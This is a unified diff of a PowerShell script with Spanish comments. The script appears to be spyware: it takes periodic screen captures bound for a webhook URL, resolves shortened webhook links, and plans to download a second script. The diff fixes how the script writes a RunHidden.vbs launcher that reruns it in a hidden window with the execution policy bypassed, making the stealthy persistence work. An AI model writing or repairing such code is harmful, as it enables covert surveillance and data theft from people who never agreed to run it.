@@ -3,10 +3,10 @@ $seconds = 30 # Intervalo entre capturas
 $maxImages = 1 # Cantidad máxima de imágenes antes de descargar el otro script
 
 # Detección de URL acortada
-if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected!!!..." ; $hookurl = (irm $hookurl).url}
+if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected..." ; $hookurl = (irm $hookurl).url}
 
 # Obtener la ruta del directorio donde se encuentra este script
-$scriptDirectory = Split-Path -Parent $MyInvocation.MyCommand.Definition
+$scriptDirectory = Split-Path -Parent $MyInvocation.MyCommand.Path
 
 # Obtener la ruta del archivo de VBScript
 $vbsScriptPath = Join-Path -Path $scriptDirectory -ChildPath "RunHidden.vbs"
@@ -15,8 +15,8 @@ $vbsScriptPath = Join-Path -Path $scriptDirectory -ChildPath "RunHidden.vbs"
 if (-not (Test-Path $vbsScriptPath)) {
 @"
 Set WshShell = CreateObject(""WScript.Shell"")
-WshShell.Run ""powershell.exe -ExecutionPolicy Bypass -File '$MyInvocation.MyCommand.Definition'"", 0, false
-"@ | Set-Content -Path $vbsScriptPath -Encoding ASCII
+WshShell.Run ""powershell.exe -ExecutionPolicy Bypass -File '$($MyInvocation.MyCommand.Path)'"", 0, false
+"@ | Out-File -FilePath $vbsScriptPath -Encoding ASCII
 }
 
 do {
